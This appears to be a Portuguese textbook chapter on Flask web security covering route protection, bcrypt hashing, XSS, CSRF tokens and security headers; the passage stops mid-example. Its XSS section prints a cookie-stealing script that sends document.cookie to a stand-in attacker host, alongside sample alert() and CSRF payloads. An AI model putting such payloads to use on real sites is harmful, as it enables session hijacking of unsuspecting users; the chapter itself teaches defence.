# Capítulo 6: Segurança Web Essencial para Flask

## 📑 Sumário do Capítulo

- [6.1 Por que Segurança Importa? Os Riscos Reais](#61-por-que-segurança-importa-os-riscos-reais)
- [6.2 Autenticação e Autorização: Protegendo Rotas](#62-autenticação-e-autorização-protegendo-rotas)
- [6.3 Senhas Seguras: Hashing com bcrypt](#63-senhas-seguras-hashing-com-bcrypt)
- [6.4 XSS (Cross-Site Scripting): O que é e como prevenir](#64-xss-cross-site-scripting-o-que-é-e-como-prevenir)
- [6.5 CSRF (Cross-Site Request Forgery): Proteção com Flask-WTF](#65-csrf-cross-site-request-forgery-proteção-com-flask-wtf)
- [6.6 SQL Injection: Por que ORM nos protege](#66-sql-injection-por-que-orm-nos-protege)
- [6.7 HTTPS e Variáveis de Ambiente: Protegendo Dados Sensíveis](#67-https-e-variáveis-de-ambiente-protegendo-dados-sensíveis)
- [6.8 Projeto: Implementando Login Seguro no PokéBooster](#68-projeto-implementando-login-seguro-no-pokébooster)
- [6.9 Verifique seu Conhecimento](#69-verifique-seu-conhecimento)
- [6.10 Exercícios Práticos](#610-exercícios-práticos)

---

## 🎯 Introdução

Nos capítulos anteriores, construímos uma aplicação web funcional e interativa. Implementamos persistência de dados, autenticação de usuários e integração com APIs. No entanto, há um aspecto crítico que permeia todo o desenvolvimento web e que merece atenção especial: **a segurança**.

**Segurança não é um recurso opcional** — é uma necessidade fundamental em qualquer aplicação web moderna. Uma falha de segurança pode comprometer não apenas sua aplicação, mas também os dados pessoais de seus usuários, sua reputação profissional e até mesmo gerar consequências legais.

Neste capítulo, abordaremos as principais vulnerabilidades de segurança web e como implementar proteções eficazes no Flask. Você aprenderá a proteger sua aplicação contra os ataques mais comuns e a implementar práticas de segurança que são padrão na indústria.

---

## 6.1 Por que Segurança Importa? Os Riscos Reais

### 🚨 O Cenário Atual

Aplicações web são alvos constantes de ataques automatizados e direcionados. Segundo o **OWASP (Open Web Application Security Project)**, milhões de aplicações são comprometidas anualmente devido a vulnerabilidades básicas que poderiam ter sido evitadas.

### 💥 Consequências de Falhas de Segurança

Quando uma aplicação é comprometida, as consequências podem ser devastadoras:

#### 1. Roubo de Dados
- 🔓 Informações pessoais expostas
- 💳 Dados financeiros comprometidos
- 🔑 Senhas vazadas
- 📧 E-mails e mensagens privadas acessadas

#### 2. Perda de Confiança
- 👥 Usuários abandonam a plataforma
- 📰 Manchetes negativas na mídia
- 💼 Parceiros comerciais se afastam
- 📉 Queda no valor da empresa

#### 3. Impacto Financeiro
- 💰 Multas por violação de privacidade (LGPD, GDPR)
- 🔧 Custos de recuperação e correção
- 👨‍💼 Custos com consultoria de segurança
- 📊 Perda de receita durante o período offline

#### 4. Danos à Reputação
- 🏢 Credibilidade destruída
- 🎯 Dificuldade em atrair novos usuários
- 📱 Avaliações negativas
- 🌐 Manchas permanentes na internet

#### 5. Responsabilidade Legal
- ⚖️ Processos judiciais
- 📜 Violação de regulamentações
- 🚔 Possíveis investigações criminais
- 📋 Obrigação de notificar usuários afetados

### 📊 O OWASP Top 10

O **OWASP** mantém uma lista das 10 vulnerabilidades mais críticas em aplicações web. Esta lista é atualizada periodicamente e serve como referência para a indústria:

| Posição | Vulnerabilidade | Descrição |
|---------|----------------|-----------|
| **1** | Broken Access Control | Falhas no controle de acesso permitem que usuários acessem recursos não autorizados |
| **2** | Cryptographic Failures | Falhas na proteção de dados sensíveis em trânsito ou em repouso |
| **3** | Injection | SQL, NoSQL, OS Command e outras injeções de código malicioso |
| **4** | Insecure Design | Falhas de design de segurança desde a concepção |
| **5** | Security Misconfiguration | Configurações inseguras em qualquer nível da stack |
| **6** | Vulnerable Components | Uso de bibliotecas e frameworks desatualizados |
| **7** | Authentication Failures | Falhas na identificação e autenticação de usuários |
| **8** | Data Integrity Failures | Falhas de integridade de software e dados |
| **9** | Security Logging Failures | Falta de monitoramento e logging adequados |
| **10** | SSRF | Requisições forjadas do lado do servidor |

> 💡 **Neste capítulo**, focaremos nas vulnerabilidades mais relevantes para aplicações Flask, com exemplos práticos do nosso projeto PokéBooster.

### 🎯 O Princípio da Defesa em Profundidade

A segurança não é uma única medida, mas sim **múltiplas camadas de proteção**:

```
┌─────────────────────────────────────┐
│   HTTPS/SSL (Criptografia)         │
├─────────────────────────────────────┤
│   Firewall e Rate Limiting          │
├─────────────────────────────────────┤
│   Autenticação e Autorização        │
├─────────────────────────────────────┤
│   Validação de Entrada              │
├─────────────────────────────────────┤
│   Sanitização de Saída              │
├─────────────────────────────────────┤
│   Proteção CSRF                     │
├─────────────────────────────────────┤
│   Proteção SQL Injection (ORM)      │
├─────────────────────────────────────┤
│   Logging e Monitoramento           │
└─────────────────────────────────────┘
```

Cada camada adiciona proteção. Se uma falhar, as outras ainda protegem a aplicação.

---

## 6.2 Autenticação e Autorização: Protegendo Rotas

### 🔐 Diferença entre Autenticação e Autorização

Estes dois conceitos são frequentemente confundidos, mas são fundamentalmente diferentes:

| Conceito | Pergunta | Exemplo |
|----------|----------|---------|
| **Autenticação** | *Quem é você?* | Login com username e senha |
| **Autorização** | *O que você pode fazer?* | Apenas admins podem deletar usuários |

### 📝 Analogia do Mundo Real

Pense em um prédio corporativo:

- **Autenticação**: Mostrar seu crachá na entrada para provar que você é funcionário
- **Autorização**: O crachá indica se você pode acessar o 5º andar (área restrita)

### 💻 Implementando Autenticação Básica

#### Passo 1: Decorator para Proteger Rotas

Vamos criar um decorator personalizado que verifica se o usuário está logado:

```python
# app.py
from flask import Flask, session, redirect, url_for, request
from functools import wraps

app = Flask(__name__)
app.secret_key = 'sua-chave-secreta-forte'

# Decorator para proteger rotas
def login_required(f):
    """
    Decorator que verifica se o usuário está autenticado.
    Se não estiver, redireciona para a página de login.
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            # Salva a URL que o usuário tentou acessar
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

# Rota pública - qualquer um pode acessar
@app.route('/')
def index():
    return "Página inicial - Aberta a todos"

# Rota protegida - apenas usuários logados
@app.route('/area_protegida')
@login_required
def area_protegida():
    username = session.get('username', 'Usuário')
    return f"Bem-vindo à área protegida, {username}!"

# Rota protegida - perfil do usuário
@app.route('/perfil')
@login_required
def perfil():
    user_id = session['user_id']
    username = session['username']
    return f"Perfil de {username} (ID: {user_id})"
```

#### 📊 Como Funciona o Decorator

```python
# Sem o decorator
@app.route('/perfil')
def perfil():
    # Precisaríamos verificar manualmente em CADA rota:
    if 'user_id' not in session:
        return redirect(url_for('login'))
    # ... resto do código ...

# Com o decorator
@app.route('/perfil')
@login_required  # <- Uma linha protege tudo!
def perfil():
    # Código direto, sem verificações repetitivas
    pass
```

### 🎭 Implementando Autorização por Roles (Papéis)

Nem todos os usuários autenticados têm as mesmas permissões. Vamos implementar um sistema de **roles** (papéis):

```python
# app.py
from flask import Flask, session, redirect, url_for
from functools import wraps

# Decorator para verificar role específica
def role_required(role):
    """
    Decorator que verifica se o usuário tem a role necessária.
    
    Uso:
        @app.route('/admin')
        @login_required
        @role_required('admin')
        def admin_panel():
            ...
    """
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            # Verifica se o usuário está logado
            if 'user_id' not in session:
                return redirect(url_for('login'))
            
            # Verifica se tem a role necessária
            if session.get('user_role') != role:
                return "Acesso negado. Você não tem permissão para esta página.", 403
            
            return f(*args, **kwargs)
        return decorated_function
    return decorator

# Rota para usuários comuns
@app.route('/minha_colecao')
@login_required
def minha_colecao():
    return "Sua coleção de cartas Pokémon"

# Rota apenas para administradores
@app.route('/admin')
@login_required
@role_required('admin')
def admin_panel():
    return "Painel de Administração - Apenas Admins"

# Rota apenas para moderadores
@app.route('/moderar')
@login_required
@role_required('moderador')
def moderar():
    return "Painel de Moderação"
```

### 📝 Exemplo Completo: Login com Roles

```python
# app.py
from flask import Flask, render_template, request, session, redirect, url_for, flash
from werkzeug.security import check_password_hash

app = Flask(__name__)
app.secret_key = 'chave-super-secreta'

# Simulação de banco de dados de usuários
USUARIOS = {
    'ash': {
        'senha_hash': 'hash_da_senha_ash',
        'role': 'usuario'
    },
    'admin': {
        'senha_hash': 'hash_da_senha_admin',
        'role': 'admin'
    }
}

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        senha = request.form['senha']
        
        # Busca o usuário
        usuario = USUARIOS.get(username)
        
        # Verifica credenciais
        if usuario and check_password_hash(usuario['senha_hash'], senha):
            # Armazena informações na sessão
            session['user_id'] = username
            session['username'] = username
            session['user_role'] = usuario['role']  # <- Role armazenada
            
            flash('Login bem-sucedido!', 'success')
            
            # Redireciona para a página que o usuário tentou acessar
            next_page = request.args.get('next')
            return redirect(next_page or url_for('index'))
        
        flash('Credenciais inválidas', 'danger')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    # Remove todas as informações da sessão
    session.clear()
    flash('Você foi desconectado', 'info')
    return redirect(url_for('index'))
```

### 🎯 Melhorando o Modelo de Roles no Banco de Dados

Em uma aplicação real, roles devem ser armazenadas no banco:

```python
# app.py
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy(app)

class Usuario(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    senha_hash = db.Column(db.String(128), nullable=False)
    role = db.Column(db.String(20), default='usuario')  # 'usuario', 'moderador', 'admin'
    
    def is_admin(self):
        """Verifica se o usuário é administrador."""
        return self.role == 'admin'
    
    def is_moderador(self):
        """Verifica se o usuário é moderador ou admin."""
        return self.role in ['moderador', 'admin']
```

### ✅ Checklist de Autenticação e Autorização

- [ ] Todas as rotas sensíveis estão protegidas com `@login_required`
- [ ] Rotas administrativas usam `@role_required`
- [ ] Informações sensíveis não estão na URL
- [ ] Sessions expirarm após período de inatividade
- [ ] Logout limpa completamente a sessão
- [ ] Redirecionamento pós-login funciona corretamente
- [ ] Mensagens de erro não revelam informações sensíveis

---

## 6.3 Senhas Seguras: Hashing com bcrypt

### ⚠️ Por que Nunca Armazenar Senhas em Texto Plano

Armazenar senhas em texto plano é uma das piores práticas de segurança. Se o banco de dados for comprometido, **todas** as senhas ficam expostas.

#### 💣 Exemplo de Código PERIGOSO

```python
# ❌ NUNCA FAÇA ISSO!
@app.route('/registro', methods=['POST'])
def registro():
    username = request.form['username']
    senha = request.form['senha']  # <- Senha em texto plano
    
    # Salvando senha DIRETAMENTE no banco
    novo_usuario = Usuario(username=username, senha=senha)  # PERIGOSO!
    db.session.add(novo_usuario)
    db.session.commit()
```

**Por que isso é terrível?**

1. 💀 Se o banco for hackeado, todas as senhas são roubadas
2. 👀 Administradores do banco podem ver as senhas
3. 🔑 Usuários reutilizam senhas em múltiplos sites
4. ⚖️ Viola regulamentações de proteção de dados (LGPD, GDPR)
5. 🏢 Destrói a confiança dos usuários

### 🛡️ A Solução: Hashing de Senhas

**Hashing** é uma função matemática de mão única que transforma qualquer texto em uma sequência de caracteres fixa:

```
Senha: "pikachu123"
Hash:  "$2b$12$KIXvXEuyCfWPDbN3lPW8ju7rBfY9TZ3dCF..."
```

**Propriedades importantes:**

- ✅ **Irreversível**: Impossível descobrir a senha original pelo hash
- ✅ **Determinística**: Mesma senha sempre gera o mesmo hash
- ✅ **Avalanche Effect**: Pequena mudança na senha = hash completamente diferente

### 🔒 Instalando bcrypt

```bash
pip install flask-bcrypt
```

### 💻 Implementação Completa com bcrypt

```python
# app.py
from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from flask_bcrypt import Bcrypt

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)

class Usuario(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    senha_hash = db.Column(db.String(128), nullable=False)
    
    def set_senha(self, senha):
        """
        Cria o hash da senha usando bcrypt.
        
        Args:
            senha (str): Senha em texto plano
        """
        self.senha_hash = bcrypt.generate_password_hash(senha).decode('utf-8')
    
    def check_senha(self, senha):
        """
        Verifica se a senha fornecida está correta.
        
        Args:
            senha (str): Senha em texto plano para verificar
            
        Returns:
            bool: True se a senha está correta, False caso contrário
        """
        return bcrypt.check_password_hash(self.senha_hash, senha)
```

### 📝 Uso nas Rotas

#### Registro de Usuário

```python
@app.route('/registro', methods=['GET', 'POST'])
def registro():
    if request.method == 'POST':
        username = request.form['username']
        senha = request.form['senha']
        
        # Validação da força da senha
        if len(senha) < 8:
            flash('Senha deve ter no mínimo 8 caracteres', 'warning')
            return redirect(url_for('registro'))
        
        # Verifica se o usuário já existe
        if Usuario.query.filter_by(username=username).first():
            flash('Nome de usuário já existe', 'warning')
            return redirect(url_for('registro'))
        
        # Cria novo usuário
        novo_usuario = Usuario(username=username)
        novo_usuario.set_senha(senha)  # <- Cria o hash da senha
        
        try:
            db.session.add(novo_usuario)
            db.session.commit()
            flash('Conta criada com sucesso! Faça login.', 'success')
            return redirect(url_for('login'))
        except Exception as e:
            db.session.rollback()
            flash('Erro ao criar conta', 'danger')
            print(f"Erro: {e}")
    
    return render_template('registro.html')
```

#### Login de Usuário

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        senha = request.form['senha']
        
        # Busca o usuário no banco
        usuario = Usuario.query.filter_by(username=username).first()
        
        # Verifica usuário E senha
        if usuario and usuario.check_senha(senha):  # <- Verifica o hash
            # Login bem-sucedido
            session['user_id'] = usuario.id
            session['username'] = usuario.username
            flash('Login bem-sucedido!', 'success')
            return redirect(url_for('index'))
        
        # Credenciais inválidas
        # Mensagem genérica para não revelar se o usuário existe
        flash('Usuário ou senha inválidos', 'danger')
    
    return render_template('login.html')
```

### 🔬 Como o bcrypt Funciona

```python
# Quando você cria uma senha
senha_original = "pikachu123"
hash_gerado = bcrypt.generate_password_hash(senha_original)
print(hash_gerado)
# Saída: b'$2b$12$KIXvXEuyCfWPDbN3lPW8juN2h3.vScxF...'
#         ↑   ↑   ↑                    ↑
#         |   |   |                    |
#         |   |   |----- Salt ---------|--- Hash
#         |   |
#         |   |---- Cost Factor (12 = 2^12 iterações)
#         |
#         |-------- Algoritmo (bcrypt)
```

**Componentes:**
- **Algoritmo**: Identifica que é bcrypt
- **Cost Factor**: Número de iterações (12 = 4096 iterações)
- **Salt**: Valor aleatório único para cada senha
- **Hash**: O resultado final

### 🧂 O que é Salt?

**Salt** é uma string aleatória adicionada à senha antes do hashing:

```
Sem Salt:
senha: "123456" → hash: "abc123..."
senha: "123456" → hash: "abc123..."  (MESMO HASH!)

Com Salt:
senha: "123456" + salt: "x7k9m2" → hash: "def456..."
senha: "123456" + salt: "p4q8n1" → hash: "ghi789..."  (HASHES DIFERENTES!)
```

**Por que isso importa?**
- Previne ataques com **rainbow tables** (tabelas pré-computadas de hashes)
- Mesmo senhas idênticas geram hashes diferentes
- O bcrypt gera um salt automaticamente para cada senha

### 📊 Comparação: Hashing Inseguro vs bcrypt

| Aspecto | MD5/SHA1 (Inseguro) | bcrypt (Seguro) |
|---------|---------------------|-----------------|
| **Velocidade** | Muito rápido | Lento por design |
| **Salt** | Não incluso | Automático |
| **Iterações** | 1 vez | 2^12 (4096) vezes |
| **Resistência a força bruta** | Fraca | Forte |
| **Uso recomendado** | ❌ Nunca para senhas | ✅ Ideal para senhas |

### 🎯 Validação de Força de Senha

```python
import re

def validar_senha(senha):
    """
    Valida se a senha atende aos requisitos de segurança.
    
    Requisitos:
    - Mínimo 8 caracteres
    - Pelo menos uma letra maiúscula
    - Pelo menos uma letra minúscula
    - Pelo menos um número
    - Pelo menos um caractere especial
    
    Returns:
        tuple: (bool, str) - (senha_valida, mensagem_erro)
    """
    if len(senha) < 8:
        return False, "Senha deve ter no mínimo 8 caracteres"
    
    if not re.search(r'[A-Z]', senha):
        return False, "Senha deve conter pelo menos uma letra maiúscula"
    
    if not re.search(r'[a-z]', senha):
        return False, "Senha deve conter pelo menos uma letra minúscula"
    
    if not re.search(r'\d', senha):
        return False, "Senha deve conter pelo menos um número"
    
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', senha):
        return False, "Senha deve conter pelo menos um caractere especial"
    
    return True, "Senha válida"

# Uso na rota de registro
@app.route('/registro', methods=['POST'])
def registro():
    senha = request.form['senha']
    
    valida, mensagem = validar_senha(senha)
    if not valida:
        flash(mensagem, 'warning')
        return redirect(url_for('registro'))
    
    # Continua com o registro...
```

### ✅ Checklist de Segurança de Senhas

- [ ] Usar bcrypt (ou argon2, scrypt) para hashing
- [ ] Nunca armazenar senhas em texto plano
- [ ] Validar força da senha (mínimo 8 caracteres)
- [ ] Usar salt automático (bcrypt faz isso)
- [ ] Mensagens de erro genéricas (não revelar se usuário existe)
- [ ] Implementar rate limiting em tentativas de login
- [ ] Permitir reset de senha com token temporário
- [ ] Não transmitir senhas sem HTTPS

---

## 6.4 XSS (Cross-Site Scripting): O que é e como prevenir

### ⚠️ O que é XSS?

**XSS (Cross-Site Scripting)** é uma vulnerabilidade que permite a um atacante injetar código malicioso (geralmente JavaScript) em páginas visualizadas por outros usuários.

### 🎭 Tipos de XSS

#### 1. Stored XSS (Armazenado)

O código malicioso é **armazenado** no servidor (banco de dados) e executado toda vez que a página é carregada.

**Exemplo:**
```python
# Usuário malicioso posta um comentário:
comentario = "<script>alert('Você foi hackeado!');</script>"

# O comentário é salvo no banco:
db.session.add(Comentario(texto=comentario))
db.session.commit()

# Quando outros usuários veem o comentário:
# O script é executado no navegador deles!
```

#### 2. Reflected XSS (Refletido)

O código malicioso vem de uma **requisição** (URL, formulário) e é imediatamente refletido na resposta.

**Exemplo:**
```python
# URL maliciosa:
# http://seusite.com/busca?q=<script>alert('XSS')</script>

@app.route('/busca')
def busca():
    termo = request.args.get('q')
    # Se você fizer isso, o script será executado:
    return f"Você buscou por: {termo}"  # PERIGOSO!
```

#### 3. DOM-based XSS (Baseado em DOM)

O código malicioso manipula o **DOM** diretamente no navegador.

**Exemplo:**
```javascript
// JavaScript vulnerável:
let nome = document.location.hash.substring(1);
document.getElementById('saudacao').innerHTML = "Olá, " + nome;

// URL maliciosa:
// http://seusite.com/#<img src=x onerror="alert('XSS')">
```

### 💣 Exemplo de Ataque XSS Real

Imagine um site de perfis de usuários onde você pode adicionar uma "bio":

```html
<!-- Bio do usuário malicioso: -->
<script>
    // Rouba o cookie de sessão e envia para o atacante
    fetch('http://atacante.com/roubar?cookie=' + document.cookie);
</script>
```

Quando outro usuário visita o perfil, o script:
1. 🔓 Captura o cookie de sessão da vítima
2. 📤 Envia para o servidor do atacante
3. 🎭 O atacante agora pode se passar pela vítima!

### 🛡️ Como o Jinja2 Protege Contra XSS

Por padrão, o **Jinja2** escapa automaticamente todas as variáveis:

```html
<!-- Template Jinja2 -->
<p>{{ nome_usuario }}</p>

<!-- Se nome_usuario = "<script>alert('XSS')</script>" -->

<!-- Resultado SEGURO (escapado): -->
<p>&lt;script&gt;alert('XSS')&lt;/script&gt;</p>

<!-- O navegador exibe o texto literalmente, não executa o script -->
```

### 📊 Tabela de Escape Automático

| Caractere | Escapado para | Resultado |
|-----------|---------------|-----------|
| `<` | `&lt;` | `<` é exibido como texto |
| `>` | `&gt;` | `>` é exibido como texto |
| `"` | `&quot;` | `"` é exibido como texto |
| `'` | `&#39;` | `'` é exibido como texto |
| `&` | `&amp;` | `&` é exibido como texto |

### ⚠️ O Perigo do Filtro `|safe`

O filtro `|safe` **desabilita** a proteção XSS:

```html
<!-- ❌ PERIGOSO - Desabilita proteção -->
<div>{{ comentario_usuario|safe }}</div>

<!-- Se comentario_usuario contém <script>, ele será EXECUTADO! -->
```

**Regra de Ouro:** 
> 🚫 **Nunca use `|safe` com dados fornecidos por usuários!**

### ✅ Como Exibir HTML Confiável com Segurança

Se você **realmente** precisa exibir HTML (por exemplo, de um editor rich-text), use uma biblioteca de sanitização:

```python
# Instale: pip install bleach
import bleach

@app.route('/salvar_comentario', methods=['POST'])
def salvar_comentario():
    comentario_bruto = request.form['comentario']
    
    # Define quais tags HTML são permitidas
    tags_permitidas = ['p', 'strong', 'em', 'a']
    atributos_permitidos = {'a': ['href', 'title']}
    
    # Sanitiza o HTML (remove scripts maliciosos)
    comentario_limpo = bleach.clean(
        comentario_bruto,
        tags=tags_permitidas,
        attributes=atributos_permitidos,
        strip=True
    )
    
    # Agora é seguro salvar no banco
    db.session.add(Comentario(texto=comentario_limpo))
    db.session.commit()
    
    return redirect(url_for('index'))
```

### 🔒 Proteção XSS no JavaScript

No lado do cliente, o perigo vem de usar `innerHTML`:

```javascript
// ❌ VULNERÁVEL
let nome = getUserInput();
element.innerHTML = nome;  // Pode executar scripts!

// ✅ SEGURO - Trata como texto puro
element.textContent = nome;

// ✅ SEGURO - Criar elementos via DOM
const p = document.createElement('p');
p.textContent = nome;
element.appendChild(p);
```

### 📝 Exemplo Prático: Comentários Seguros

```python
# models.py
class Comentario(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    texto = db.Column(db.Text, nullable=False)
    autor_id = db.Column(db.Integer, db.ForeignKey('usuario.id'))
    criado_em = db.Column(db.DateTime, default=datetime.utcnow)

# routes.py
@app.route('/comentar', methods=['POST'])
def comentar():
    texto_bruto = request.form['comentario']
    
    # Validação de comprimento
    if len(texto_bruto) > 1000:
        flash('Comentário muito longo (máximo 1000 caracteres)', 'warning')
        return redirect(url_for('index'))
    
    # Sanitização (se permitir HTML limitado)
    import bleach
    texto_limpo = bleach.clean(
        texto_bruto,
        tags=['p', 'br'],
        strip=True
    )
    
    # Salva no banco
    comentario = Comentario(
        texto=texto_limpo,
        autor_id=session['user_id']
    )
    db.session.add(comentario)
    db.session.commit()
    
    flash('Comentário adicionado com sucesso!', 'success')
    return redirect(url_for('index'))
```

```html
<!-- template.html -->
<div class="comentarios">
    {% for comentario in comentarios %}
        <div class="card mb-3">
            <div class="card-body">
                <!-- Jinja2 escapa automaticamente -->
                <p>{{ comentario.texto }}</p>
                
                <small class="text-muted">
                    Por {{ comentario.autor.username }} 
                    em {{ comentario.criado_em.strftime('%d/%m/%Y') }}
                </small>
            </div>
        </div>
    {% endfor %}
</div>
```

### 🔐 Content Security Policy (CSP)

**CSP** é um header HTTP que instrui o navegador sobre quais recursos podem ser carregados:

```python
@app.after_request
def set_security_headers(response):
    # Content Security Policy
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "  # Apenas recursos do mesmo domínio
        "script-src 'self' https://cdn.jsdelivr.net; "  # Scripts apenas do nosso site e CDN
        "style-src 'self' https://cdn.jsdelivr.net; "  # Estilos apenas do nosso site e CDN
        "img-src 'self' https://raw.githubusercontent.com data:; "  # Imagens de nós e GitHub
        "font-src 'self' https://cdn.jsdelivr.net; "  # Fontes
        "connect-src 'self'; "  # Requisições AJAX apenas para nós
        "frame-ancestors 'none';"  # Não permitir que o site seja embedado em iframe
    )
    
    # Outros headers de segurança
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    return response
```

### 📊 Tabela de Headers de Segurança

| Header | Propósito | Valor Recomendado |
|--------|-----------|-------------------|
| `Content-Security-Policy` | Controla quais recursos podem ser carregados | Ver exemplo acima |
| `X-Content-Type-Options` | Previne MIME type sniffing | `nosniff` |
| `X-Frame-Options` | Previne clickjacking | `DENY` ou `SAMEORIGIN` |
| `X-XSS-Protection` | Ativa proteção XSS do navegador | `1; mode=block` |
| `Strict-Transport-Security` | Força uso de HTTPS | `max-age=31536000; includeSubDomains` |

### ✅ Checklist de Proteção XSS

- [ ] Jinja2 escapa automaticamente todas as variáveis
- [ ] Nunca usar `|safe` com dados de usuários
- [ ] Usar `textContent` ao invés de `innerHTML` no JavaScript
- [ ] Sanitizar HTML se realmente necessário (bleach)
- [ ] Implementar Content Security Policy (CSP)
- [ ] Validar e limitar comprimento de inputs
- [ ] Usar headers de segurança adequados
- [ ] Testar inputs maliciosos durante desenvolvimento

---

## 6.5 CSRF (Cross-Site Request Forgery): Proteção com Flask-WTF

### ⚠️ O que é CSRF?

**CSRF (Cross-Site Request Forgery)** é um ataque onde um site malicioso **força** o navegador do usuário a fazer requisições não autorizadas para outro site onde o usuário está autenticado.

### 💣 Exemplo de Ataque CSRF

Imagine que você está logado no **PokéBooster** e visita um site malicioso. Esse site contém:

```html
<!-- Site malicioso -->
<img src="http://pokebooster.com/deletar_conta?confirmar=sim">
```

O navegador automaticamente:
1. 🔗 Faz uma requisição GET para `/deletar_conta`
2. 🍪 Inclui automaticamente os cookies de sessão do PokéBooster
3. 💥 Sua conta é deletada sem você saber!

### 🎯 Como o CSRF Funciona

```
┌────────────────────┐
│  Usuário logado    │
│  no Site A         │
└─────────┬──────────┘
          │
          │ 1. Visita site malicioso
          ↓
┌────────────────────┐
│  Site Malicioso B  │
│  <img src=         │
│  "http://siteA     │
│  /deletar">        │
└─────────┬──────────┘
          │
          │ 2. Navegador faz requisição automática
          ↓
┌────────────────────┐
│   Site A           │
│   (com cookies!)   │
│   → Deleta conta   │
└────────────────────┘
```

### 🛡️ A Solução: CSRF Token

Um **CSRF Token** é um valor secreto, único e imprevisível que é:
1. Gerado pelo servidor
2. Incluído em cada formulário
3. Verificado em cada requisição POST/PUT/DELETE

```
┌──────────┐    1. GET /formulario     ┌──────────┐
│  Cliente │ ────────────────────────> │ Servidor │
│          │                            │          │
│          │ <──────────────────────── │          │
│          │  2. HTML + CSRF Token     │          │
│          │     (abc123xyz...)        │          │
│          │                            │          │
│          │ 3. POST + Token correto   │          │
│          │ ────────────────────────> │          │
│          │    (abc123xyz...)         │  ✅ OK   │
│          │                            │          │
│  Site    │ 4. POST + Token errado    │          │
│  Malic.  │ ────────────────────────> │          │
│          │    (xyz789abc...)         │  ❌ 403  │
└──────────┘                            └──────────┘
```

**Por que isso protege?**
- O site malicioso não conhece o token
- O token é único para cada sessão
- O token é verificado no servidor

### 📦 Instalando Flask-WTF

```bash
pip install flask-wtf
```

### 💻 Configuração Básica

```python
# app.py
from flask import Flask
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'sua-chave-secreta-forte-e-aleatoria'

# Ativa proteção CSRF em toda a aplicação
csrf = CSRFProtect(app)
```

### 📝 Usando em Formulários HTML

```html
<!-- templates/deletar_conta.html -->
{% extends 'base.html' %}

{% block content %}
<div class="container mt-5">
    <h2>Deletar Conta</h2>
    <p class="text-danger">Esta ação é irreversível!</p>
    
    <form method="POST" action="{{ url_for('deletar_conta') }}">
        <!-- Token CSRF automático -->
        {{ csrf_token() }}
        
        <div class="mb-3">
            <label>Digite sua senha para confirmar:</label>
            <input type="password" name="senha" class="form-control" required>
        </div>
        
        <button type="submit" class="btn btn-danger">
            Deletar Minha Conta
        </button>
        <a href="{{ url_for('index') }}" class="btn btn-secondary">
            Cancelar
        </a>
    </form>
</div>
{% endblock %}
```

**HTML Renderizado:**
```html
<form method="POST" action="/deletar_conta">
    <!-- Token gerado automaticamente -->
    <input type="hidden" name="csrf_token" value="ImFiYzEyM3h5ei4uLiI.ZsH...">
    
    <input type="password" name="senha" required>
    <button type="submit">Deletar Minha Conta</button>
</form>
```

### 🔧 Verificação Automática no Servidor

```python
# app.py
@app.route('/deletar_conta', methods=['GET', 'POST'])
@login_required
def deletar_conta():
    if request.method == 'POST':
        # Flask-WTF verifica o token automaticamente!
        # Se o token estiver errado/ausente, retorna erro 400
        
        senha = request.form['senha']
        usuario = Usuario.query.get(session['user_id'])
        
        # Verifica a senha
        if not usuario.check_senha(senha):
            flash('Senha incorreta', 'danger')
            return redirect(url_for('deletar_conta'))
        
        # Deleta a conta
        db.session.delete(usuario)
        db.session.commit()
        
        session.clear()
        flash('Sua conta foi deletada', 'info')
        return redirect(url_for('index'))
    
    return render_template('deletar_conta.html')
```

### 🌐 Proteção em Requisições AJAX

Para requisições JavaScript (fetch, AJAX), precisamos incluir o token manualmente:

#### Passo 1: Adicionar meta tag no base.html

```html
<!-- templates/base.html -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Token CSRF disponível para JavaScript -->
    <meta name="csrf-token" content="{{ csrf_token() }}">
    
    <title>{% block title %}PokéBooster{% endblock %}</title>
</head>
```

#### Passo 2: Usar o token no JavaScript

```javascript
// static/app.js

// Função helper para obter o CSRF token
function getCSRFToken() {
    return document.querySelector('meta[name="csrf-token"]').content;
}

// Exemplo: Migrar para nuvem (atualizado com CSRF)
function salvarNaNuvem() {
    const colecao = localStorage.getItem('poke_colecao');
    const csrfToken = getCSRFToken();
    
    fetch('/api/migrar_para_nuvem', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': csrfToken  // <- Token no header
        },
        body: colecao
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Erro na requisição');
        }
        return response.json();
    })
    .then(data => {
        alert(data.mensagem);
    })
    .catch(error => {
        console.error('Erro:', error);
        alert('Erro ao salvar na nuvem');
    });
}

// Exemplo: Abrir pacote (atualizado com CSRF)
document.getElementById('btn-abrir-pacote').addEventListener('click', () => {
    const csrfToken = getCSRFToken();
    
    fetch('/abrir_pacote', {
        method: 'POST',
        headers: {
            'X-CSRFToken': csrfToken  // <- Token no header
        }
    })
    .then(response => response.json())
    .then(data => {
        exibirCartasNoModal(data.cartas);
    });
});
```

### ⚙️ Configurações Avançadas

#### Isentar Rotas Específicas (usar com cautela!)

```python
# app.py
from flask_wtf.csrf import CSRFProtect, exempt

app = Flask(__name__)
csrf = CSRFProtect(app)

# Rota isenta de CSRF (útil para APIs públicas)
@app.route('/api/public/stats')
@csrf.exempt
def public_stats():
